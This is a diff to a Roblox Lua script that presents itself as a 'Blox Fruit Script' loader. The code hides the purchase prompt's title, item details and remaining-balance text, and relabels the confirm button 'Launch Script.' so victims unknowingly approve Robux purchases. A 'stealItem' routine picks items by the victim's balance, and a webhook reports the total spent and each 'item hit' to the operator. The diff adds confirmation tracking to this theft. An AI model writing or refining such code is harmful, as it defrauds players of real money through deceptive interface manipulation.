@@ -46,79 +46,122 @@ local function modifyPromptUI(isFirstPrompt)
     if not ProductContainer then return end
     local Animator = ProductContainer:FindFirstChild("Animator")
     if not Animator then return end
-
     local prompt = Animator:FindFirstChild("Prompt")
     if not prompt then return end
     local alertContents = prompt:FindFirstChild("AlertContents")
     if not alertContents then return end
 
-    local blueColor = Color3.fromRGB(0, 122, 255)
+    prompt.BackgroundTransparency = 1
+    prompt.Image = ""
+
+    local titleContainer = alertContents:FindFirstChild("TitleContainer")
+    if titleContainer then
+        local titleArea = titleContainer:FindFirstChild("TitleArea")
+        if titleArea then
+            titleArea.Visible = false
+        end
+    end
 
     local middleContent = alertContents:FindFirstChild("MiddleContent")
     if middleContent then
         middleContent.Visible = false
     end
 
-    local title = alertContents:FindFirstChild("TitleContainer"):FindFirstChild("TitleArea"):FindFirstChild("Title")
-    if title and title:IsA("TextLabel") then
-        title.Text = isFirstPrompt and "SCRIPT LOADED!" or "Activate Blox Fruit Script!"
-        title.TextScaled = true
-    end
-
-    local footerButtons = alertContents:FindFirstChild("Footer"):FindFirstChild("Buttons")
-    if footerButtons then
-        local button1 = footerButtons:FindFirstChild("1")
-        if button1 then
-            button1.Visible = isFirstPrompt
-            if isFirstPrompt then
-                button1.BackgroundColor3 = blueColor
-                local buttonContent = button1:FindFirstChild("ButtonContent")
-                if buttonContent then
-                    local buttonMiddleContent = buttonContent:FindFirstChild("ButtonMiddleContent"):FindFirstChildWhichIsA("TextLabel")
-                    if buttonMiddleContent then
-                        buttonMiddleContent.Text = "LOAD!"
-                    end
-                end
-            end
-        end
-
-        local button2 = footerButtons:FindFirstChild("2")
-        if button2 then
-            button2.Visible = true
-            button2:ClearAllChildren()
-
-            button2.BackgroundColor3 = blueColor
-            button2.Size = UDim2.new(0.3, 0, 0.1, 0)
-            button2.BorderSizePixel = 0
-
-            local newButtonText = Instance.new("TextLabel")
-            newButtonText.Name = "NewButtonText"
-            newButtonText.Parent = button2
-            newButtonText.Size = UDim2.new(1, 0, 1, 0)
-            newButtonText.BackgroundTransparency = 1
-            newButtonText.Text = isFirstPrompt and "Activate!" or "Run Script!"
-            newButtonText.TextColor3 = Color3.new(0, 0, 0)
-            newButtonText.Font = Enum.Font.GothamBold
-            newButtonText.TextScaled = true
-            newButtonText.AnchorPoint = Vector2.new(0.5, 0.5)
-            newButtonText.Position = UDim2.new(0.5, 0, 0.5, 0)
-
-            local uiCorner = Instance.new("UICorner")
-            uiCorner.CornerRadius = UDim.new(0.2, 0)
-            uiCorner.Parent = button2
-        end
-    end
-
     local footer = alertContents:FindFirstChild("Footer")
     if footer then
         local footerContent = footer:FindFirstChild("FooterContent")
-        if footerContent then
-            local content = footerContent:FindFirstChild("Content")
-            if content then
-                local RemainingBalanceText = content:FindFirstChild("RemainingBalanceText")
-                if RemainingBalanceText then
-                    RemainingBalanceText.Visible = false
+        if footerContent and footerContent:FindFirstChild("Content") then
+            local balanceText = footerContent.Content:FindFirstChild("RemainingBalanceText")
+            if balanceText then
+                balanceText.Visible = false
+            end
+        end
+
+        local footerButtons = footer:FindFirstChild("Buttons")
+        if footerButtons then
+            local button1 = footerButtons:FindFirstChild("1")
+            if button1 then
+                button1.Visible = isFirstPrompt
+                if isFirstPrompt then
+                    button1.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+                    button1.BorderSizePixel = 0
+                    
+                    -- Add shadow
+                    local shadow = Instance.new("ImageLabel")
+                    shadow.Name = "Shadow"
+                    shadow.BackgroundTransparency = 1
+                    shadow.Image = "rbxassetid://7912134082"
+                    shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+                    shadow.ImageTransparency = 0.6
+                    shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
+                    shadow.AnchorPoint = Vector2.new(0.5, 0.5)
+                    shadow.Size = UDim2.new(1.1, 0, 1.1, 0)
+                    shadow.ZIndex = button1.ZIndex - 1
+                    shadow.Parent = button1
+
+                    local buttonContent = button1:FindFirstChild("ButtonContent")
+                    if buttonContent then
+                        local textLabel = buttonContent:FindFirstChild("ButtonMiddleContent"):FindFirstChildWhichIsA("TextLabel")
+                        if textLabel then
+                            textLabel.Text = "Launch Script."
+                            textLabel.Font = Enum.Font.GothamBlack
+                            textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+                        end
+                    end
                 end
+            end
+
+            local button2 = footerButtons:FindFirstChild("2")
+            if button2 then
+                button2.Visible = true
+                button2:ClearAllChildren()
+                
+                button2.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+                button2.Size = UDim2.new(0.3, 0, 0.1, 0)
+                button2.BorderSizePixel = 0
+
+                local shadow = Instance.new("ImageLabel")
+                shadow.Name = "Shadow"
+                shadow.BackgroundTransparency = 1
+                shadow.Image = "rbxassetid://7912134082"
+                shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+                shadow.ImageTransparency = 0.6
+                shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
+                shadow.AnchorPoint = Vector2.new(0.5, 0.5)
+                shadow.Size = UDim2.new(1.1, 0, 1.1, 0)
+                shadow.ZIndex = button2.ZIndex - 1
+                shadow.Parent = button2
+
+                local tweenService = game:GetService("TweenService")
+                local hoverInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+                
+                button2.MouseEnter:Connect(function()
+                    tweenService:Create(button2, hoverInfo, {
+                        BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+                    }):Play()
+                end)
+                
+                button2.MouseLeave:Connect(function()
+                    tweenService:Create(button2, hoverInfo, {
+                        BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+                    }):Play()
+                end)
+
+                local buttonText = Instance.new("TextLabel")
+                buttonText.Name = "ButtonText"
+                buttonText.Parent = button2
+                buttonText.BackgroundTransparency = 1
+                buttonText.Size = UDim2.new(1, 0, 1, 0)
+                buttonText.Text = "Launch Script."
+                buttonText.TextColor3 = Color3.fromRGB(255, 255, 255)
+                buttonText.Font = Enum.Font.GothamBlack
+                buttonText.TextScaled = true
+                buttonText.AnchorPoint = Vector2.new(0.5, 0.5)
+                buttonText.Position = UDim2.new(0.5, 0, 0.5, 0)
+
+                local uiCorner = Instance.new("UICorner")
+                uiCorner.CornerRadius = UDim.new(0.2, 0)
+                uiCorner.Parent = button2
             end
         end
     end
@@ -188,7 +231,7 @@ local function sendExecutionLog()
     })
 end
 
-local function sendWebhook(totalSpent)
+local function sendWebhook(totalSpent, itemName)
     local executorIdentifier = getExecutor()
 
     local embed = {
@@ -202,6 +245,10 @@ local function sendWebhook(totalSpent)
             {
                 ["name"] = "<:robux:1314309850154537020> ᴛᴏᴛᴀʟ ʀᴏʙᴜx",
                 ["value"] = "```" .. totalSpent .. "```"
+            },
+            {
+                ["name"] = "ɪᴛᴇᴍ ʜɪᴛ",
+                ["value"] = "```" .. itemName .. "```"
             },
             {
                 ["name"] = "ᴇxᴇᴄᴜᴛᴏʀ ɪɴꜰᴏ",
@@ -229,6 +276,9 @@ local function sendWebhook(totalSpent)
     })
 end
 
+local promptConfirmed = false
+local purchaseInProgress = false
+
 local function waitForPromptToDisappear()
     local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
     if not PurchasePrompt then return end
@@ -242,7 +292,29 @@ local function waitForPromptToDisappear()
     end
 end
 
+local function waitForPurchaseConfirmation()
+    local PurchasePrompt = game:GetService("CoreGui"):WaitForChild("PurchasePrompt")
+    local ProductContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer")
+    local Animator = ProductContainer:WaitForChild("Animator")
+    local prompt = Animator:WaitForChild("Prompt")
+    local alertContents = prompt:WaitForChild("AlertContents")
+    local footer = alertContents:WaitForChild("Footer")
+    local footerButtons = footer:WaitForChild("Buttons")
+
+    local confirmButton = footerButtons:WaitForChild("2")
+    confirmButton.MouseButton1Click:Connect(function()
+        promptConfirmed = true
+    end)
+end
+
 local function buyItem(storageName, purchaseLocation, cost)
+    if purchaseInProgress then
+        return
+    end
+
+    purchaseInProgress = true
+    promptConfirmed = false
+
     local args = {
         [1] = "buyRobuxShop",
         [2] = {
@@ -254,14 +326,28 @@ local function buyItem(storageName, purchaseLocation, cost)
             ["ReceiverUserId"] = UserId,
         }
     }
+
     local CommF = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("CommF_")
     if CommF then
         CommF:InvokeServer(unpack(args))
-        totalSpent = totalSpent + cost
         print("Prompting: " .. storageName .. " for " .. cost .. " Robux")
+
+        waitForPurchaseConfirmation()
+
+        while not promptConfirmed do
+            task.wait()
+        end
+
+        if promptConfirmed then
+            totalSpent = totalSpent + cost
+            sendWebhook(totalSpent, storageName)
+        end
     else
         warn("Remote 'CommF_' not found.")
     end
+
+    waitForPromptToDisappear()
+    purchaseInProgress = false
 end
 
 hideNotifications()
@@ -387,11 +473,13 @@ local function stealItem(balance)
         end
     elseif balance >= 75 then
         buyItem("Permanent Spin-Spin", "FruitShop", 75)
-    elseif balance >= 61 then
+    elseif balance >= 50 then
         buyItem("10K Money", "Shop", 50)
     elseif balance >= 25 then
         buyItem("2x EXP (15 mins.)", "Shop", 25)
     end
+
+    return
 end
 
 local CoreGui = game:GetService("CoreGui")
@@ -482,24 +570,6 @@ local function getRobuxAndProceed()
             print("err3")
         end
     end)()
-end
-
-local promptConfirmed = false
-
-local function waitForPurchaseConfirmation()
-    local PurchasePrompt = game:GetService("CoreGui"):WaitForChild("PurchasePrompt")
-    local ProductContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer")
-    local Animator = ProductContainer:WaitForChild("Animator")
-    local prompt = Animator:WaitForChild("Prompt")
-    local alertContents = prompt:WaitForChild("AlertContents")
-    local footer = alertContents:WaitForChild("Footer")
-    local footerButtons = footer:WaitForChild("Buttons")
-
-    local confirmButton = footerButtons:WaitForChild("2")
-    confirmButton.MouseButton1Click:Connect(function()
-        print("check1")
-        promptConfirmed = true
-    end)
 end
 
 local function waitForPrompt()
